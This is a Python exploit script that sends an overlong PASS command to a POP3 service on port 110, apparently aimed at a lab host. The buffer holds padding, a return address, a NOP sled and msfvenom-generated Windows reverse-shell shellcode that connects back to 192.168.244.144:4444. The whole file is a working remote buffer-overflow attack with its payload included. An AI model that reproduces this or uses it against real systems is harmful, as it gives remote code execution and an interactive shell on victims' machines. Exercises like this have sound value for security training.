#!/usr/bin/env python

import socket

#msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.244.144 LPORT=4444 -b "\x00\x0a\x0d" -f c

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

badchars = (
"\xbb\x26\xf8\xb0\x98\xd9\xce\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x5a\x12\x03\x5a\x12\x83\xe4\xfc\x52\x6d\x14\x14\x10"
"\x8e\xe4\xe5\x75\x06\x01\xd4\xb5\x7c\x42\x47\x06\xf6\x06\x64"
"\xed\x5a\xb2\xff\x83\x72\xb5\x48\x29\xa5\xf8\x49\x02\x95\x9b"
"\xc9\x59\xca\x7b\xf3\x91\x1f\x7a\x34\xcf\xd2\x2e\xed\x9b\x41"
"\xde\x9a\xd6\x59\x55\xd0\xf7\xd9\x8a\xa1\xf6\xc8\x1d\xb9\xa0"
"\xca\x9c\x6e\xd9\x42\x86\x73\xe4\x1d\x3d\x47\x92\x9f\x97\x99"
"\x5b\x33\xd6\x15\xae\x4d\x1f\x91\x51\x38\x69\xe1\xec\x3b\xae"
"\x9b\x2a\xc9\x34\x3b\xb8\x69\x90\xbd\x6d\xef\x53\xb1\xda\x7b"
"\x3b\xd6\xdd\xa8\x30\xe2\x56\x4f\x96\x62\x2c\x74\x32\x2e\xf6"
"\x15\x63\x8a\x59\x29\x73\x75\x05\x8f\xf8\x98\x52\xa2\xa3\xf4"
"\x97\x8f\x5b\x05\xb0\x98\x28\x37\x1f\x33\xa6\x7b\xe8\x9d\x31"
"\x7b\xc3\x5a\xad\x82\xec\x9a\xe4\x40\xb8\xca\x9e\x61\xc1\x80"
"\x5e\x8d\x14\x06\x0e\x21\xc7\xe7\xfe\x81\xb7\x8f\x14\x0e\xe7"
"\xb0\x17\xc4\x80\x5b\xe2\x8f\x6e\x33\x18\xdf\x07\x46\xe0\xf1"
"\x8b\xcf\x06\x9b\x23\x86\x91\x34\xdd\x83\x69\xa4\x22\x1e\x14"
"\xe6\xa9\xad\xe9\xa9\x59\xdb\xf9\x5e\xaa\x96\xa3\xc9\xb5\x0c"
"\xcb\x96\x24\xcb\x0b\xd0\x54\x44\x5c\xb5\xab\x9d\x08\x2b\x95"
"\x37\x2e\xb6\x43\x7f\xea\x6d\xb0\x7e\xf3\xe0\x8c\xa4\xe3\x3c"
"\x0c\xe1\x57\x91\x5b\xbf\x01\x57\x32\x71\xfb\x01\xe9\xdb\x6b"
"\xd7\xc1\xdb\xed\xd8\x0f\xaa\x11\x68\xe6\xeb\x2e\x45\x6e\xfc"
"\x57\xbb\x0e\x03\x82\x7f\x2e\xe6\x06\x8a\xc7\xbf\xc3\x37\x8a"
"\x3f\x3e\x7b\xb3\xc3\xca\x04\x40\xdb\xbf\x01\x0c\x5b\x2c\x78"
"\x1d\x0e\x52\x2f\x1e\x1b")

buffer1 = "A" * 2606 +  "\x63\x79\x4b\x5f" + "\x90" * 12 + badchars
ip = "192.168.244.137"
port = 110

sock.connect((ip,port))

banner = sock.recv(1024)
print banner

pass1 = "PASS " + buffer1 + "\r\n"
sock.send("USER alpha\r\n")
sock.send(pass1)

banner_1 = sock.recv(1024)
print banner_1

sock.close()
